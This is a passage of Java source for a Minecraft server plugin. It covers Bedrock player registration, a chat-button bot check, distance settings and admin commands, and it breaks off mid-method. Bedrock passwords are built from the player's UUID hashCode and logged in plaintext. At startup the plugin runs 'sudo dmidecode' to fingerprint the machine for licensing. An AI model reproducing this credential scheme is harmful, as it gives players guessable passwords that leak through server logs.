package dpear.gpg;

import com.magmaguy.elitemobs.api.EliteMobDeathEvent;
import com.magmaguy.elitemobs.api.EliteMobRemoveEvent;
import com.magmaguy.elitemobs.api.EliteMobSpawnEvent;
import fr.xephi.authme.api.v3.AuthMeApi;
import net.md_5.bungee.api.ChatColor;
import net.md_5.bungee.api.chat.*;
import net.md_5.bungee.api.chat.hover.content.Text;
import net.milkbowl.vault.permission.Permission;
import org.bukkit.Bukkit;
import org.bukkit.Sound;
import org.bukkit.command.*;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.*;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.event.Listener;
import org.bukkit.scheduler.BukkitRunnable;
import org.geysermc.floodgate.api.FloodgateApi;

import javax.annotation.ParametersAreNonnullByDefault;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.*;


public class main extends JavaPlugin {

    //全局变量
    public static Boolean PassCheck = false;
    public static String PluginVersion = "2.2";
    public static String Developer = "MownSoft666";
    Plugin plugin = this;
    public RegisteredServiceProvider<Permission> rsp = getServer().getServicesManager().getRegistration(Permission.class);
    double[] Music = {0.890899,
            0.890899,0.890899,0.943874,1.059463, //3345
            1.059463,0.943874,0.890899,0.793701, //5432
            0.707107,0.707107,0.793701,0.890899, //1123
            0.890899,0.793701,0.793701, //322
            0.890899,0.890899,0.943874,1.059463, //3345
            1.059463,0.943874,0.890899,0.793701, //5432
            0.707107,0.707107,0.793701,0.890899, //1123
            0.793701,0.707107,0.707107 //211
    };

    ArrayList <String>SoundPad = new ArrayList<>(
            List.of("q", "a", "w", "s", "e", "d", "f", "t", "g", "y", "h", "j", "i", "k", "o", "l", "p", ";", "'", "]",
                    "z", "x", "c", "n", "m")
    );

    ArrayList <String>SoundPad_High = new ArrayList<>(
            List.of("Q", "A", "W", "S", "E", "D", "F", "T", "G", "Y", "H", "J", "I", "K", "O", "L", "P", ":", "\"", "}",
                    "Z", "X", "C", "N", "M")
    );

    PlaceholderExtension PAPIE = new PlaceholderExtension(this);

    public ArrayList<String> UnCheckPlayers = new ArrayList<String>(List.of("notch"));

    //ip搜索
    public IPsearch ipsearch;

    //工具类
    public Tools tools = new Tools(this,getConfig());

    //精英怪
    public ElitemobsHandler elitemobs = null;
    public boolean isElitemobsHandlerEnabled = false;

    //基岩版菜单
    public BedrockMenu bedrockMenu = null;

    //命令转接
    public CommandAlert commandAlert = null;
    public boolean isCommandAlertEnabled = false;

    //版本命令
    public VersionCommand versionCommand = null;
    public boolean isVersionCommandEnabled = false;

    @Override
    public void onEnable() {

        //打印logo
        getLogger().info("");
        getLogger().info(plugin.getName() + " Powered by ");
        getLogger().info("    __  ___                         __  _________");
        getLogger().info("   /  |/  /__  ____ _      ______  /  |/  / ____/");
        getLogger().info("  / /|_/ / _ \\/ __ \\ | /| / / __ \\/ /|_/ / /     ");
        getLogger().info(" / /  / /  __/ /_/ / |/ |/ / / / / /  / / /___   ");
        getLogger().info("/_/  /_/\\___/\\____/|__/|__/_/ /_/_/  /_/\\____/");
        getLogger().info("Our Github: https://github.com/MeownMC");
        getLogger().info("");

        //生成作者列表
        StringBuilder sb = new StringBuilder();
        sb.append("Author: ");
        for (String au : plugin.getDescription().getAuthors()) {
            sb.append(au+" ");
        }
        getLogger().info(sb.toString());

        getLogger().info("");
        getLogger().info("正在进行预加载");

        PluginVersion = this.getDescription().getVersion();

        //localServer = new LocalServer();

        //saveDefaultConfig();

        if(!getConfig().getString("ConfigVersion", "0").equals(PluginVersion)){
            getLogger().warning("过期的配置文件版本!请将旧版本配置文件迁移至新版本");
            getLogger().warning("这可能导致意料之外的异常");
        };

        //获取机器码
        getLogger().info("正在获取CID");
        String OsName = System.getProperties().getProperty("os.name");

        String ComputerCode = "FAILURE";
        String ComputerCode_SHA = "";


        //如果使用Windows
        if (OsName.startsWith("Windows")){
            getLogger().info("您正在使用Windows");

            try {
                Process process = Runtime.getRuntime().exec(new String[] { "wmic", "cpu", "get", "ProcessorId" });
                process.getOutputStream().close();
                Scanner sc = new Scanner(process.getInputStream());

                ComputerCode = sc.next();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        //如果使用Linux
        if (OsName.equals("Linux")){
            getLogger().info("您正在使用Linux/GNU");

            try {
                Process process = Runtime.getRuntime().exec("sudo dmidecode -s system-uuid");
                InputStream in;
                BufferedReader br;
                in = process.getInputStream();
                br = new BufferedReader(new InputStreamReader(in));
                while (in.read() != -1) {
                    ComputerCode = br.readLine();
                }
                br.close();
                in.close();
                process.destroy();
            } catch (Throwable e) {
                e.printStackTrace();
            }
        }

        if (Objects.equals(ComputerCode, "FAILURE")){
            getLogger().warning("CID获取失败");
            getLogger().warning("没有以管理员身份运行或不受支持的操作系统");
            ComputerCode = new Random().toString();
        }

        getLogger().info("正在加密CID");
        try {
            byte[] encrypted = MessageDigest.getInstance("SHA-256").digest(ComputerCode.getBytes(StandardCharsets.UTF_8));
            StringBuilder SHA = new StringBuilder();
            for (byte b : encrypted) {
                SHA.append(String.format("%02x", b));
            }
            ComputerCode_SHA = SHA.toString();
            getLogger().info("您的SCID: " + ComputerCode_SHA);

        }catch (Exception e){
            e.printStackTrace();
        }


        getLogger().info("正在比对SCID-C");
        String ComputerCode_PMD = ComputerCode_SHA + this.getName() + PluginVersion + Developer;
        String ComputerCode_MD = "FAILURE";


        try {
            byte[] encrypted = MessageDigest.getInstance("md5").digest(ComputerCode_PMD.getBytes(StandardCharsets.UTF_8));
            StringBuilder MD = new StringBuilder();
            for (byte b : encrypted) {
                MD.append(String.format("%02x", b));
            }
            ComputerCode_MD = MD.toString();

        }catch (Exception e){
            ComputerCode_MD = "FAILURE";
            e.printStackTrace();
        }

        if (ComputerCode_MD.equals("FAILURE")){
            getLogger().warning("SCID-C获取失败");
            ComputerCode_MD = new Random().toString();
        }
        if(getConfig().getString("SCID-C", "Null").equals(ComputerCode_MD)){
            getLogger().info("SCID-C校验成功");
            PassCheck = true;
        }else{
            getLogger().info("SCID-C校验失败");
        }

        getLogger().info("插件已验证，开始加载");

        //检查有没有PlaceholderAPI
        if(Bukkit.getPluginManager().getPlugin("PlaceholderAPI") == null){
            getLogger().warning("未检测到PlaceholderAPI");
            getLogger().warning("本插件无法在没有PlaceholderAPI的情况下工作");
        }else{
            getLogger().info("已检测到PlaceholderAPI");
            try {
                PAPIE.register();
                PAPIE.EnableSeasonWorlds = getConfig().getStringList("RealisticSeasonsPAPIFix.EnabledWorld");
                getLogger().info("PlaceholderAPI挂钩成功");
            } catch (Exception e) {
                getLogger().warning("PlaceholderAPI挂钩失败");
                getLogger().warning("详细信息: ");
                e.printStackTrace();
            }
        };

        //检查有没有floodgate
        if(Bukkit.getPluginManager().getPlugin("floodgate") == null){
            getLogger().warning("未检测到floodgate");
            getLogger().warning("本插件无法在没有floodgate的情况下工作");
        }else{
            getLogger().info("已检测到floodgate");
        };

        //检查有没有AuthMe
        if(Bukkit.getPluginManager().getPlugin("AuthMe") == null){
            getLogger().warning("未检测到AuthMe相关功能不可用");
        }else{
            getLogger().info("已检测到AuthMe相关功能可用");
        };

        //检查有没有PlugManX
        if(Bukkit.getPluginManager().getPlugin("PlugManX") == null){
            getLogger().warning("未检测到PlugManX相关功能不可用");
        }else{
            getLogger().info("已检测到PlugManX相关功能可用");
        };

        //检查有没有ViaVersion
        if(Bukkit.getPluginManager().getPlugin("ViaVersion") == null){
            getLogger().warning("未检测到ViaVersion相关功能不可用");
        }else{
            getLogger().info("已检测到ViaVersion相关功能可用");
        };

        //检查有没有ProtocolSupport
        if(Bukkit.getPluginManager().getPlugin("ProtocolSupport") == null){
            getLogger().warning("未检测到ProtocolSupport相关功能不可用");
        }else{
            getLogger().info("已检测到ProtocolSupport相关功能可用");
        };

        //检查有没有Vault
        if(Bukkit.getPluginManager().getPlugin("Vault") == null){
            getLogger().warning("未检测到Vault相关功能不可用");
        }else{
            getLogger().info("已检测到Vault相关功能可用");
        };

        if(getConfig().getBoolean("Register.EventListener", false)){
            getServer().getPluginManager().registerEvents(new EventListener(), this);
            getLogger().info("事件监听器注册成功");
        }
        if (Bukkit.getPluginCommand("checkplayerbe") != null) {
            Bukkit.getPluginCommand("checkplayerbe").setExecutor(new Commander_L());
            getLogger().info("注册指令/checkplayerbe成功");
        }
        if (Bukkit.getPluginCommand("regbeplayer") != null) {
            Bukkit.getPluginCommand("regbeplayer").setExecutor(new Commander_R());
            getLogger().info("注册指令/regbeplayer成功");
        }
        if (Bukkit.getPluginCommand("bemenu") != null) {
            Bukkit.getPluginCommand("bemenu").setExecutor(new Commander_M());
            getLogger().info("注册指令/bemenu成功");
        }
        Objects.requireNonNull(Bukkit.getPluginCommand("bemenu")).setTabCompleter(new TabHandler());
        getLogger().info("注册指令/bemenu补全器完成");

        getLogger().info("注册BungeeCord通道");
        plugin.getServer().getMessenger().registerOutgoingPluginChannel(plugin, "BungeeCord");

        //加载类
        loadExClass();
        //LoadCommandAlertTabComplete();

        if (!PassCheck){
            getLogger().info("Fail in checking SCID-C");
            getServer().getPluginManager().disablePlugin(this);
        }else{
            getLogger().info("插件加载完毕！感谢使用");
            getLogger().info("作者D-Pear QQ:1448360624");
            getLogger().info("有问题可以向作者反馈哦~");
        }

    }

    @Override
    public void onDisable(){

        getLogger().info("关闭ip搜索器");
        ipsearch.close();

        getLogger().info("注销BungeeCord通道");
        plugin.getServer().getMessenger().unregisterOutgoingPluginChannel(plugin, "BungeeCord");
    }

    public class EventListener implements Listener {
        @EventHandler
        public void onPlayerJoin(PlayerJoinEvent e) {

            if(!AuthMeApi.getInstance().isRegistered(e.getPlayer().getName())){
                //只检查未注册玩家
                if(!FloodgateApi.getInstance().isFloodgatePlayer(e.getPlayer().getUniqueId())){
                    //跳过基岩版玩家

                    //添加到未通过测试玩家
                    if (!UnCheckPlayers.contains(e.getPlayer().getName())) {
                        UnCheckPlayers.add(e.getPlayer().getName());
                    }

                    //发送验证消息
                    e.getPlayer().sendMessage("");
                    e.getPlayer().sendMessage("");

                    int t;

                    //不要点按钮(Red)
                    BaseComponent Red = new TextComponent("> > > [不要点我] < < <");
                    Red.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new Text("§d>>点击我被踢出服务器<<")));
                    Red.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/register "+ e.getPlayer().getName().hashCode()));
                    Red.setColor(ChatColor.RED);

                    for (t = 0; t<new Random().nextInt(0,3);t = t + 1) {
                        e.getPlayer().sendMessage(Red);
                    }

                    //不要点按钮(Yellow)
                    BaseComponent Yellow = new TextComponent("> > > [不要点我啦~] < < <");
                    Yellow.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new Text("§d>>点击人家被踢出服务器<<")));
                    Yellow.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/register "+ e.getPlayer().getName().hashCode()));
                    Yellow.setColor(ChatColor.YELLOW);

                    for (t = 0; t<new Random().nextInt(0,2);t = t + 1) {
                        e.getPlayer().sendMessage(Yellow);
                    }

                    //要点的
                    BaseComponent Green = new TextComponent("> > > [点我完成真人验证] < < <");
                    Green.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new Text("§d>>点击我完成验证<<")));
                    Green.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/register "+ e.getPlayer().getName().hashCode() + e.getPlayer().getUniqueId().hashCode() + e.getPlayer().getUniqueId()));
                    Green.setColor(ChatColor.GREEN);
                    e.getPlayer().sendMessage(Green);

                    //不要点按钮(Yellow)
                    for (t = 0; t<new Random().nextInt(0,2);t = t + 1) {
                        e.getPlayer().sendMessage(Yellow);
                    }

                    //不要点按钮(Red)
                    for (t = 0; t<new Random().nextInt(0,3);t = t + 1) {
                        e.getPlayer().sendMessage(Red);
                    }

                    e.getPlayer().sendMessage("");
                    e.getPlayer().sendMessage("");

                }
            }

            if (getConfig().getString("Command.OnPlayerJoin","Null").equals("Null")) {
                return;
            }

            //延迟执行
            BukkitRunnable Runable = new BukkitRunnable() {
                @Override
                public void run() {
                    ConsoleCommandSender console = Bukkit.getServer().getConsoleSender();
                    Bukkit.dispatchCommand(console,
                            getConfig().getString("Command.OnPlayerJoin", "checkplayerbe %PlayerName").
                                    replace("%PlayerName", e.getPlayer().getName()).
                                    replace("%PlayerUUID", e.getPlayer().getUniqueId().toString()));
                }
            };
            Runable.runTaskLater(plugin,500);
        }

        @EventHandler
        public void onPlayerCommand(PlayerCommandPreprocessEvent e) {

            //是否通过验证
            if(UnCheckPlayers.contains(e.getPlayer().getName())){
                e.setCancelled(true);
                if(e.getMessage().startsWith("/register ")){
                    if(e.getMessage().equals("/register " + e.getPlayer().getName().hashCode() + e.getPlayer().getUniqueId().hashCode() + e.getPlayer().getUniqueId())) {
                        //通过
                        UnCheckPlayers.remove(e.getPlayer().getName());
                        e.getPlayer().sendMessage("§a§l已过人机验证，可以注册了");
                        return;
                    }
                    //不对
                    if(e.getMessage().equals("/register " + e.getPlayer().getName().hashCode())) {
                        e.getPlayer().kickPlayer("§c§l都说了不要点人家啦~");
                        return;
                    }
                    e.getPlayer().sendMessage("§c§l请点击上面按钮通过人机验证后注册 §4(看不到消息可以尝试重进服务器)");
                    return;
                }
                e.getPlayer().sendMessage("§c§l请点击上面按钮通过人机验证后使用命令 §4(看不到消息可以尝试重进服务器)");
                return;
            }

            //未被取消
            if (!e.isCancelled()){

                //启用功能
                if (isCommandAlertEnabled){

                    //调用
                    commandAlert.onPlayerCommand(e.getPlayer(),e.getMessage());
                }
            }

        }

        @EventHandler
        public void onCommandChangeWorld(PlayerChangedWorldEvent e){
            String version = Bukkit.getMinecraftVersion();

            //设置视距
            e.getPlayer().setViewDistance(
                    getConfig().getInt("ViewDistance."+e.getPlayer().getWorld().getName(),e.getPlayer().getViewDistance())
            );

            //判断版本
            if (tools.isHighVersion) {
                //设置模拟距离
                e.getPlayer().setSimulationDistance(
                        getConfig().getInt("SimulationDistance." + e.getPlayer().getWorld().getName(), e.getPlayer().getSimulationDistance())
                );
            } else {
                //设置假视距
                e.getPlayer().setNoTickViewDistance(
                        getConfig().getInt("NoTickViewDistance." + e.getPlayer().getWorld().getName(), e.getPlayer().getNoTickViewDistance())
                );
            }
        }

        @EventHandler
        public void onChatEvent(PlayerChatEvent e){

            //是否通过验证
            if(UnCheckPlayers.contains(e.getPlayer().getName())){
                e.setCancelled(true);
                e.getPlayer().sendMessage("§c§l请点击上面按钮通过人机验证后发送消息 §4(看不到消息可以尝试重进服务器)");
                return;
            }

            if (e.getMessage().startsWith("切噜～♪切")){
                try {
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "rainbowbc 玩家" + e.getPlayer().getName() + "发送了一条切噜语消息，已自动翻译:"
                            + Cheru.decrypt(e.getMessage()));
                }catch (Exception ignored){}//不会翻译能不能别翻译[doge]
            }

            if (e.getMessage().startsWith("ToCheRu")){
                e.setMessage(Cheru.encrypt(e.getMessage().substring(7)));
                e.getPlayer().sendMessage("已将您的消息转换为切噜语");
            }

        }

    }

    public class TabHandler implements TabCompleter {

        @ParametersAreNonnullByDefault
        public List<String> onTabComplete(CommandSender sender, Command cmd, String label, String[] args) {
            if (!(sender instanceof Player)) {
                // 控制台注册个鬼
                return null;
            }

            if (args.length == 1){
                //((Player) sender).getPlayer().playSound(((Player) sender).getPlayer().getLocation(),Sound.BLOCK_NOTE_BLOCK_HARP, 1,((float)(args[0].length()+1)/4)%2);

                if (args[0].length() < Music.length) {
                    ((Player) sender).getPlayer().playSound(((Player) sender).getPlayer().getLocation(),
                            Sound.BLOCK_NOTE_BLOCK_HARP, 1F, (float) Music[args[0].length()]);
                }
                return (Tools.KeepStartWith (args[0] , List.of("gc","open","help","about","reload","version","plreload","authmelogin","listversion","piano","SetDistance","GetDistance","cheru","light","clearEMCB","sudo","ipr")));
            }

            if (args.length == 2){
                if (args[0].equals("piano")) {
                    return (Tools.KeepStartWith (args[1] , List.of("bass","snare","hat","basedrum","bell","flute","chime","guitar","xylophone","iron_xylophone", "cow_bell","didgeridoo","bit","banjo","pling","harp")));
                }

                if (args[0].equals("SetDistance")) {
                    return (Tools.KeepStartWith (args[1] , List.of("NoTickViewDistance","ViewDistance","SimulationDistance")));
                }

                if (args[0].equals("GetDistance")) {
                    return (Tools.KeepStartWith (args[1] , List.of("NoTickViewDistance","ViewDistance","SimulationDistance")));
                }

                if (args[0].equals("light")) {
                    return (Tools.KeepStartWith (args[1] , List.of("clear","1","2","3","4","5","6","7","8","9","10","11","12","13","14","15")));
                }

                if (args[0].equals("cheru")) {
                    return (Tools.KeepStartWith (args[1] , List.of("encrypt","decrypt","send")));
                }

                if (args[0].equals("sudo")) {
                    return null;
                }

            }

            if (args.length == 3){
                if (args[0].equals("piano")){
                    if (args[2].length() != 0){

                        int NoteNumber = SoundPad.indexOf(args[2].substring(args[2].length() - 1));
                        Player player = ((Player) sender).getPlayer();

                        String BlockName = "minecraft:sea_lantern";


                        //高音?
                        if (NoteNumber == -1){
                            NoteNumber = SoundPad_High.indexOf(args[2].substring(args[2].length() - 1));

                            if (NoteNumber == -1){
                                //不存在
                                return (List.of("","Last:null","What's the next?"));
                            }else {
                                //高音
                                player.playSound(((Player) sender).getPlayer().getLocation(),
                                        "block.note_block."+args[1]+"_1", 1F, Tools.GetNote(NoteNumber));
                                if (player.isOp()) {
                                    if(player.getLevel() == 14514) {
                                        Bukkit.dispatchCommand(player, "summon minecraft:falling_block ~ ~-2 ~1 {BlockState:{Name:\""+BlockName+"\"},Tags:[\"nbs\",\"nbs_1\"],Glowing:1,Time:-120,DropItem:0,Motion:["
                                                + String.valueOf(-((double) (NoteNumber+1)/10)-1.2) + "d,1.5d,1.5d]}");
                                    }
                                }
                                return (List.of("","Last:+" + NoteNumber, "What's the next?"));
                            }
                        }else {
                            //只有一个肯定不可能低音
                            if (args[2].length() > 1) {
                                if (args[2].charAt(args[2].length() - 2) == '/') {
                                    //低音
                                    player.playSound(player.getLocation(),
                                            "block.note_block."+args[1]+"_-1", 1F, Tools.GetNote(NoteNumber));
                                    if (player.isOp()) {
                                        if(player.getLevel() == 14514) {
                                            Bukkit.dispatchCommand(player, "summon minecraft:falling_block ~ ~-2 ~1 {BlockState:{Name:\""+BlockName+"\"},Tags:[\"nbs\",\"nbs_1\"],Glowing:1,Time:-120,DropItem:0,Motion:["
                                                    + String.valueOf(-((double) (NoteNumber+1)/10)+3.6) + "d,1.5d,1.5d]}");
                                        }
                                    }
                                    return (List.of("","Last:-" + NoteNumber, "What's the next?"));
                                } else {
                                    //中音
                                    player.playSound(player.getLocation(),
                                            "block.note_block."+args[1], 1F, Tools.GetNote(NoteNumber));
                                    if (player.isOp()) {
                                        if(player.getLevel() == 14514) {
                                            Bukkit.dispatchCommand(player, "summon minecraft:falling_block ~ ~-2 ~1 {BlockState:{Name:\""+BlockName+"\"},Tags:[\"nbs\",\"nbs_1\"],Glowing:1,Time:-120,DropItem:0,Motion:["
                                                    + String.valueOf(-((double) (NoteNumber+1)/10)+1.2) + "d,1.5d,1.5d]}");
                                        }
                                    }
                                    return (List.of("","Last:" + NoteNumber, "What's the next?"));

                                }
                            }else {
                                //中音
                                player.playSound(player.getLocation(),
                                        "block.note_block."+args[1], 1F, Tools.GetNote(NoteNumber));
                                if (player.isOp()) {
                                    if(player.getLevel() == 14514) {
                                        Bukkit.dispatchCommand(player, "summon minecraft:falling_block ~ ~-2 ~1 {BlockState:{Name:\""+BlockName+"\"},Tags:[\"nbs\",\"nbs_1\"],Glowing:1,Time:-120,DropItem:0,Motion:["
                                                + String.valueOf(-((double) (NoteNumber+1)/10)+1.2) + "d,1.5d,1.5d]}");
                                    }
                                }
                                return (List.of("","Last:" + NoteNumber, "What's the next?"));
                            }
                        }
                    }
                    return (List.of("What's the next?"));
                }

                if (args[0].equals("sudo")) {
                    if(Objects.equals(args[2], "")) {
                        return (List.of("c:"));
                    }
                }
            }

            if (args.length == 4){
                if (args[0].equals("SetDistance")) {
                    return (Tools.KeepStartWith (args[3] ,List.of("2","3","4","5","6","7","8","9","10","11","12")));
                }

            }

            if (args[0].equals("sudo")) {
                return (List.of(""));
            }

            return null;
        }


    }

    public class Commander_L implements CommandExecutor {
        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
            if (args.length == 0) {
                return false;
            }

            if (args.length > 1) {
                return false;

            }

            Player P = Bukkit.getPlayer(args[0]);

            //判断玩家对象是否有效
            if (P == null) {
                return false;
            }

            getLogger().info("玩家 " + P.getUniqueId() + " 加入");

            //设置视距
            P.setViewDistance(
                    getConfig().getInt("ViewDistance." + P.getWorld().getName(), P.getViewDistance())
            );

            //判断版本
            if (tools.isHighVersion) {
                //设置模拟距离
                P.setSimulationDistance(
                        getConfig().getInt("SimulationDistance." + P.getWorld().getName(), P.getSimulationDistance())
                );
            } else {
                //设置假视距
                P.setNoTickViewDistance(
                        getConfig().getInt("NoTickViewDistance." + P.getWorld().getName(), P.getNoTickViewDistance())
                );
            }

            //版本功能
            if (isVersionCommandEnabled) {
                return versionCommand.CheckAndExecute(P);
            }
            return true;
        }
    }
    public class Commander_R implements CommandExecutor {
                @Override
                public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
                    if (args.length == 0) {
                        return false;
                    }
                    ;
                    if (args.length > 1) {
                        return false;

                    }
                    ;
                    Player P = Bukkit.getPlayer(args[0]);

                    //判断玩家对象是否有效
                    if (P == null){return false;};

                    if (FloodgateApi.getInstance().isFloodgatePlayer(P.getUniqueId())) {
                        getLogger().info("为玩家 " + P.getUniqueId() + " 注册");
                        //计算密码
                        int PASSWD = P.getUniqueId().hashCode();
                        String PASSWORD_F = "Meown115141919810-Null", PASSWORD_S = "";
                        PASSWORD_F = PASSWD + "";
                        PASSWORD_S = PASSWORD_F.substring(0, 8);
                        //输出密码
                        getLogger().info("玩家 " + P.getName() + " 的密码为 " + PASSWORD_S);

                        //获得命令发送实例
                        ConsoleCommandSender console = Bukkit.getServer().getConsoleSender();

                        //读取配置
                        FileConfiguration config = getConfig();

                        //以玩家身份注册[废弃]
                        //Bukkit.dispatchCommand(PCS, "register " + PASSWORD_S + " " + PASSWORD_S);

                        //得到要发送的字符串的数组并发送
                        List<String> Message = config.getStringList("Message.OnBedrockPlayerRegister");
                        for(int i=0 ; i<Message.size() ; i++){
                            P.sendMessage(Message.get(i));
                        };

                        //得到要执行的命令并执行
                        List<String> Commands = config.getStringList("Command.OnBedrockPlayerRegister");
                        for(int i=0 ; i<Commands.size() ; i++){
                            Bukkit.dispatchCommand(console,
                                    Commands.get(i).
                                            replace("%PlayerName", P.getName()).
                                            replace("%PlayerUUID", P.getUniqueId().toString()).
                                            replace("%Password", PASSWORD_S));
                        };


                        return true;
                    }
                    return false;
        }
    }
    public class Commander_M implements CommandExecutor {
        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {

            //判断参数数量
            if (args.length == 0) {
                sender.sendMessage("参数数量错误");
                return false;
            };

            //判断是否是重载
            if (args[0].equals("reload")){

                //判断权限
                if (sender.hasPermission("dpear.gpg.reload")) {
                }else {
                    sender.sendMessage("权限不足，您没有dpear.gpg.reload权限");
                    return false;
                };

                sender.sendMessage("重载配置文件中...");
                getLogger().info("重载配置文件中...");

//                //清除指令转接
//                getLogger().info("清除指令转接补全");
//                if (getCommand("PearAliases") == null){
//                    getLogger().warning("清除指令转接补全失败！");
//                    getLogger().warning("对应对象返回Null");
//                }else{
//                    try{
//                        getLogger().info(getCommand("PearAliases").getAliases().get(0));
//                        getCommand("PearAliases").getAliases().clear();
//                        getLogger().info("清除指令转接补全成功");
//                    } catch (Exception e) {
//                        getLogger().warning("清除指令转接补全失败！");
//                        getLogger().warning("出现了意料之外的异常");
//                        e.printStackTrace();
//                    }
//                };

                //重载配置文件
                reloadConfig();
                if(!getConfig().getString("ConfigVersion", "0").equals(PluginVersion)){
                    getLogger().warning("过期的配置文件版本!请将旧版本配置文件迁移至新版本");
                    getLogger().warning("这可能导致意料之外的异常");
                };

                loadExClass();

//                //载入指令转接补全
//                getLogger().info("载入指令转接补全");
//                if (getCommand("PearAliases") == null){
//                    getLogger().warning("载入指令转接补全失败！");
//                    getLogger().warning("对应对象返回Null");
//                }else {
//                    try {
//                        getCommand("PearAliases").getAliases().addAll(getConfig().getStringList("CommandAlert.Source"));
//                        getLogger().info("载入指令转接补全成功");
//                    } catch (Exception e) {
//                        getLogger().warning("载入指令转接补全失败！");
//                        getLogger().warning("出现了意料之外的异常");
//                        e.printStackTrace();
//                    }
//                }


                getLogger().info("加载RealisticSeasons变量修复世界");
                PAPIE.EnableSeasonWorlds = getConfig().getStringList("RealisticSeasonsPAPIFix.EnabledWorld");

                sender.sendMessage("重载完毕");
                getLogger().info("重载完毕");
                return true;
            };

            //是否钢琴
            if (args[0].equals("piano")){
                sender.sendMessage("这是给你弹的，不是命令awa");
                return true;
            }

            //是否查询归属地
            if (args[0].equals("ipr")){

                //是否启用
                if (!getConfig().getBoolean("EnableIPRegion",false)) {
                    sender.sendMessage("该功能未启用");
                    return false;
                }

                //判断权限
                if (!sender.hasPermission("dpear.gpg.ipr")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.ipr权限");
                    return false;
                };

                //判读参数个数
                if (args.length != 2) {
                    sender.sendMessage("参数数量错误");
                    return false;
                };

                Player player = Bukkit.getPlayer(args[1]);
                if(player == null){
                    //ip地址
                    try {
                        sender.sendMessage("ip: " + args[1] + "的归属地是 " + ipsearch.search(args[1]));
                        return true;
                    }catch (Exception e){
                        sender.sendMessage("无效参数或发生了异常");
                        return false;
                    }
                }else{
                    //玩家ip归属地
                    sender.sendMessage("玩家: " + player.getName() + "的归属地是 " + ipsearch.search(player.getAddress().getAddress().getHostAddress()));
                    return true;
                }
            }


            //是否sudo
            if (args[0].equals("sudo")){
                //判断权限
                if (!sender.hasPermission("dpear.gpg.sudo")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.sudo权限");
                    return false;
                };

                //判读参数个数
                if (args.length <= 2) {
                    sender.sendMessage("参数数量错误");
                    return false;
                };

                //判断玩家是否有效
                Player player = Bukkit.getPlayer(args[1]);
                if (player == null){
                    sender.sendMessage("无效玩家");
                    return false;
                }

                //生成命令
                int i;
                StringBuilder sb = new StringBuilder();
                for (i=2 ; i<args.length ; i = i + 1){
                    sb.append(args[i]).append(" ");
                }
                String Goal = sb.toString();

                if (Goal.startsWith("c:")){
                    //聊天
                    player.chat(Goal.substring(2));
                    sender.sendMessage("成功让玩家 "+player.getName()+" 发送聊天信息: "+Goal.substring(2));
                }else{
                    //执行命令
                    Bukkit.dispatchCommand(player,Goal);
                    sender.sendMessage("成功让玩家 "+player.getName()+" 执行命令: "+Goal);
                }

                return true;
            }





            //判断是否是全重载
            if (args[0].equals("plreload")){

                //判断权限
                if (!sender.hasPermission("dpear.gpg.plreload")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.plreload权限");
                    return false;
                };

                if(Bukkit.getPluginManager().getPlugin("PlugManX") != null) {
                    sender.sendMessage("重载插件中...");
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "plugman reload GeyserPermGroup");
                }else{
                    sender.sendMessage("未安装PlugManX,该命令不可用");
                }
                return true;
            };

            //是否强制登入
            if (args[0].equals("authmelogin")){
                //判断权限
                if (!sender.hasPermission("dpear.gpg.authmelogin")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.authmelogin权限");
                    return false;
                };

                if (args.length != 2) {
                    sender.sendMessage("参数数量错误");
                    return false;
                };

                Player P = Bukkit.getPlayer(args[1]);
                if (P != null) {
                    AuthMeApi.getInstance().forceLogin(P);
                    sender.sendMessage("已为玩家 " + P.getName() + " 强制登入");
                    return true;
                }else{
                    sender.sendMessage("无效玩家");
                    return false;
                }
            };

            //是否设置距
            if (args[0].equals("SetDistance")){

                //判断权限
                if (!sender.hasPermission("dpear.gpg.menu.SetDistance")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.menu.SetDistance权限");
                    return false;
                };

                if (args.length != 4){
                    sender.sendMessage("参数数量错误");
                    return false;
                }

                //确定玩家有效
                Player player = Bukkit.getPlayer(args[2]);
                if (player == null){
                    sender.sendMessage("无效玩家");
                    return false;
                }

                try {
                    //是否设置NoTick视距
                    if (args[1].equals("NoTickViewDistance")) {
                        player.setNoTickViewDistance(Integer.parseInt(args[3]));
                        sender.sendMessage("成功将玩家" + player.getName() + "的NoTickViewDistance设置为" + args[3]);
                    }

                    //是否设置视距
                    if (args[1].equals("ViewDistance")) {
                        player.setViewDistance(Integer.parseInt(args[3]));
                        sender.sendMessage("成功将玩家" + player.getName() + "的ViewDistance设置为" + args[3]);
                    }

                    //是否设置模拟距离
                    if (args[1].equals("SimulationDistance")) {
                        player.setSimulationDistance(Integer.parseInt(args[3]));
                        sender.sendMessage("成功将玩家" + player.getName() + "的SimulationDistance设置为" + args[3]);
                    }
                    return true;
                }catch (Exception e){
                    sender.sendMessage("出现异常，操作无法完成，详细信息见控制台");
                    getLogger().warning("出现异常:");
                    e.printStackTrace();
                };

            }


            //是否打光
            if (args[0].equals("light")){
                //判断权限
                if (!sender.hasPermission("dpear.gpg.light")) {
                    sender.sendMessage("权限不足，您没有dpear.gpg.light权限");
                    return false;
                };

                if (args.length != 2) {
                    sender.sendMessage("参数数量错误");
                    return false;
                };

                if (args[1].equals("clear")){
                    Bukkit.dispatchCommand(sender,"fill " +
